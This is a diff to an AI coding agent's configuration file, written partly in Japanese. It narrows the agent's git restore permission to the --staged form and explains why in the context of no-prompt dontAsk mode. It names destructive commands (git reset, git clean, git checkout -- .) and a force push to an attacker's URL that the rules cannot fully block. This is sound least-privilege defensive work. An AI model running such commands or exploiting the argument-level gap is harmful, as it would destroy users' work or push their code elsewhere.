@@ -12,7 +12,7 @@ tools:
   - Bash(git status:*)
   - Bash(git diff:*)
   - Bash(git rev-parse:*)
-  - Bash(git restore:*)
+  - Bash(git restore --staged:*)
   - Bash(gh pr:*)
   - Bash(gh run:*)
   - Bash(gh api:*)
@@ -284,9 +284,11 @@ PR <url>: <kind> on <hash 先頭 12 文字> はガード条件未達のためス
 
 新たに必要な gh サブコマンドが出てきた場合は、最小権限の原則に従い、その都度 `Bash(gh <subcommand>:*)` 単位で追加する。
 
-同様に `git` も `add` / `commit` / `push` / `fetch` / `rebase` / `status` / `diff` / `rev-parse` / `restore` の実行フローで使用するサブコマンドのみを許可し、`Bash(git:*)` の broad な許可は **しない**。`permissionMode: dontAsk` により人間の確認プロンプトという最後の砦がないため、`git reset` / `git clean` / `git checkout -- .` のような**別サブコマンド**の実行は tools の許可範囲外として技術的に防ぐ。
+同様に `git` も `add` / `commit` / `push` / `fetch` / `rebase` / `status` / `diff` / `rev-parse` / `restore --staged` の実行フローで使用するサブコマンド（＋必要な引数まで）のみを許可し、`Bash(git:*)` の broad な許可は **しない**。`permissionMode: dontAsk` により人間の確認プロンプトという最後の砦がないため、`git reset` / `git clean` / `git checkout -- .` のような**別サブコマンド**の実行は tools の許可範囲外として技術的に防ぐ。
 
-ただし、この絞り込みはサブコマンド名までの制限であり、`Bash(git push:*)` は `push` の**引数**（`--force` や push 先リモート URL）までは制限しない。`git push --force <攻撃者URL>` のような、**許可済みサブコマンドの引数を悪用する** 攻撃は今回の絞り込みでは技術的に防げず、`git push --force` 単体禁止（`--force-with-lease` を使う）といった「安全弁」節のプロンプトレベルの規律に引き続き依存する。今回の変更が閉じるのは「別の破壊的サブコマンドを丸ごと実行される」経路であり、「許可済みサブコマンドに危険な引数を渡される」経路は別軸の課題として残る。
+`git restore` は `Bash(git restore --staged:*)` まで絞り込んでいる。`--staged` なしの `git restore <path>` は working tree の未コミット変更を破棄する（`git checkout -- .` 相当の効果を持つ）が、実行フロー内では Step 3.2 の `git restore --staged <path>`（ステージ済みファイルの除外）としてしか使わないため、サブコマンド名だけでなく `--staged` フラグまでパターンに含めることで、ユーザーの未コミット変更を破棄する経路をあらかじめ塞いでいる。
+
+ただし、この絞り込みはコマンドプレフィックスまでの制限であり、`Bash(git push:*)` は `push` の**引数**（`--force` や push 先リモート URL）までは制限しない。`git push --force <攻撃者URL>` のような、**許可済みサブコマンドの引数を悪用する** 攻撃は今回の絞り込みでは技術的に防げず、`git push --force` 単体禁止（`--force-with-lease` を使う）といった「安全弁」節のプロンプトレベルの規律に引き続き依存する。今回の変更が閉じるのは「別の破壊的サブコマンド・危険なフラグを丸ごと実行される」経路であり、「許可済みプレフィックスの範囲内でさらに引数を悪用される」経路は別軸の課題として残る。
 
 新たに必要な git サブコマンドが出てきた場合も同様に、その都度 `Bash(git <subcommand>:*)` 単位で追加する。
 
